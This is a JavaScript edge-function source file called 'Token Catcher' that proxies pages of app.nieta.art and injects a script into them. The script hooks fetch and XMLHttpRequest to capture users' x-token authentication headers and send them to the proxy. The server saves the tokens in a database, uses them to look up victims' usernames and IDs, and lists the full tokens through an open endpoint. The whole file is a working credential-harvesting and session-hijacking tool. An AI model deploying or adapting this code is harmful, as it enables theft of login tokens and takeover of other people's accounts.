/**
 * Token Catcher - 云函数代理
 * 
 * 功能:
 * 1. 代理目标网站并注入拦截脚本
 * 2. 接收前端上报的 x-token
 * 3. 保存 token 到数据库，获取用户信息
 * 
 * 用法:
 * GET  /api/catch?url=https://app.nieta.art/mine  → 获取注入脚本的页面
 * POST /api/catch/token                              → 提交 token
 * GET  /api/catch/tokens                             → 获取已保存的 token 列表
 */

import { sql } from '@vercel/postgres';

export const config = {
  runtime: 'edge',
};

const TARGET_ORIGIN = 'https://app.nieta.art';
const PROXY_BASE = '/api/catch';

const INJECT_SCRIPT = `
<script>
(function() {
  const API = '${PROXY_BASE}/token';
  
  function report(token, url, src) {
    if (!token || token === 'undefined' || token === 'null') return;
    fetch(API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: String(token), url, source: src })
    }).catch(() => {
      // fallback
      navigator.sendBeacon && navigator.sendBeacon(API, JSON.stringify({ token: String(token), url, source: src }));
    });
  }
  
  // 拦截 fetch
  const _fetch = window.fetch;
  window.fetch = function() {
    const url = arguments[0], opts = arguments[1] || {};
    const h = opts.headers || {};
    let t = h['x-token'] || h['X-Token'];
    if (!t && typeof h.get === 'function') t = h.get('x-token') || h.get('X-Token');
    if (t) report(t, typeof url === 'string' ? url : (url && url.url) || '', 'fetch');
    return _fetch.apply(this, arguments);
  };
  
  // 拦截 XMLHttpRequest
  const _open = XMLHttpRequest.prototype.open;
  const _setHeader = XMLHttpRequest.prototype.setRequestHeader;
  const _send = XMLHttpRequest.prototype.send;
  
  XMLHttpRequest.prototype.open = function(method, url) {
    this._method = method;
    this._url = url;
    return _open.apply(this, arguments);
  };
  
  XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
    if (name.toLowerCase() === 'x-token') this._xtoken = value;
    return _setHeader.apply(this, arguments);
  };
  
  XMLHttpRequest.prototype.send = function(body) {
    if (this._xtoken) report(this._xtoken, this._url || '', 'xhr');
    return _send.apply(this, body);
  };
  
  console.log('🔍 Token Catcher 注入成功');
})();
</script>
`;

// 创建表（首次）
async function ensureTable() {
  try {
    await sql`
      CREATE TABLE IF NOT EXISTS captured_tokens (
        id SERIAL PRIMARY KEY,
        token TEXT UNIQUE NOT NULL,
        username TEXT,
        nickname TEXT,
        user_id TEXT,
        "capturedAt" TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
        source TEXT,
        url TEXT
      )
    `;
  } catch (e) {
    console.error('[Table] 创建失败:', e.message);
  }
}

// 获取用户信息
async function fetchUserInfo(token) {
  const endpoints = [
    '/api/user/info',
    '/api/user/profile', 
    '/api/v1/user/info',
    '/user/info'
  ];
  
  for (const ep of endpoints) {
    try {
      const res = await fetch('https://api.nieta.art' + ep, {
        headers: { 'x-token': token, 'Accept': 'application/json' }
      });
      if (res.ok) {
        const data = await res.json();
        if (data && (data.username || data.nickname || data.name || data.user)) {
          const u = data.user || data;
          return {
            username: u.username || u.name || 'unknown',
            nickname: u.nickname || u.display_name || u.name || u.username || 'Unknown',
            userId: u.id || u.user_id || ''
          };
        }
      }
    } catch {}
  }
  return null;
}

export default async function handler(req) {
  const cors = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
  };
  
  if (req.method === 'OPTIONS') return new Response(null, { headers: cors });
  
  const url = new URL(req.url);
  const path = url.pathname.replace(PROXY_BASE, '') || '/';
  
  // POST /api/catch/token - 接收 token
  if (path === '/token' && req.method === 'POST') {
    await ensureTable();
    try {
      const body = await req.json();
      const { token, url: srcUrl, source } = body;
      
      if (!token) {
        return new Response(JSON.stringify({ error: '缺少 token' }), {
          status: 400, headers: { ...cors, 'Content-Type': 'application/json' }
        });
      }
      
      // 检查是否已存在
      const exist = await sql`SELECT * FROM captured_tokens WHERE token = ${token}`;
      if (exist.rows.length > 0) {
        return new Response(JSON.stringify({ 
          success: true, exists: true,
          username: exist.rows[0].username,
          nickname: exist.rows[0].nickname
        }), { headers: { ...cors, 'Content-Type': 'application/json' } });
      }
      
      // 获取用户信息
      let userInfo = null;
      try {
        userInfo = await fetchUserInfo(token);
      } catch (e) {
        console.error('[User] 获取失败:', e.message);
      }
      
      // 保存
      await sql`
        INSERT INTO captured_tokens (token, username, nickname, user_id, source, url)
        VALUES (${token}, ${userInfo?.username || 'unknown'}, ${userInfo?.nickname || 'Unknown'}, ${userInfo?.userId || ''}, ${source || ''}, ${srcUrl || ''})
      `;
      
      console.log(`🎯 捕获新 token: ${userInfo?.nickname || 'Unknown'} (${userInfo?.username || 'unknown'})`);
      
      return new Response(JSON.stringify({ 
        success: true, 
        username: userInfo?.username || 'unknown',
        nickname: userInfo?.nickname || 'Unknown'
      }), { headers: { ...cors, 'Content-Type': 'application/json' } });
      
    } catch (e) {
      return new Response(JSON.stringify({ error: e.message }), {
        status: 500, headers: { ...cors, 'Content-Type': 'application/json' }
      });
    }
  }
  
  // GET /api/catch/tokens - 获取 token 列表
  if (path === '/tokens' && req.method === 'GET') {
    await ensureTable();
    try {
      const result = await sql`
        SELECT id, token, username, nickname, user_id, "capturedAt", source, url
        FROM captured_tokens
        ORDER BY "capturedAt" DESC
        LIMIT 100
      `;
      
      return new Response(JSON.stringify({
        tokens: result.rows.map(r => ({
          ...r,
          token: r.token ? r.token.substring(0, 8) + '...' + r.token.slice(-4) : '',
          tokenFull: r.token // 完整 token（仅 API 返回）
        }))
      }), { headers: { ...cors, 'Content-Type': 'application/json' } });
    } catch (e) {
      return new Response(JSON.stringify({ error: e.message }), {
        status: 500, headers: { ...cors, 'Content-Type': 'application/json' }
      });
    }
  }
  
  // GET /api/catch/ - 代理目标网站
  if (req.method === 'GET') {
    const targetUrl = url.searchParams.get('url') || TARGET_ORIGIN + '/mine';
    
    try {
      const res = await fetch(targetUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'text/html,application/xhtml+xml',
        }
      });
      
      let body = await res.text();
      const ct = res.headers.get('content-type') || '';
      
      // 注入脚本到 HTML
      if (ct.includes('text/html')) {
        body = body.replace('</head>', INJECT_SCRIPT + '</head>');
        if (!body.includes('</head>')) body = INJECT_SCRIPT + body;
        
        // 替换页面中的 API 地址为相对路径
        body = body.replace(/https:\/\/api\.nieta\.art/g, '');
      }
      
      return new Response(body, {
        status: res.status,
        headers: {
          'Content-Type': ct || 'text/html',
          'X-Frame-Options': 'SAMEORIGIN',
        }
      });
    } catch (e) {
      return new Response(`代理错误: ${e.message}`, { status: 502 });
    }
  }
  
  return new Response('Not Found', { status: 404 });
}
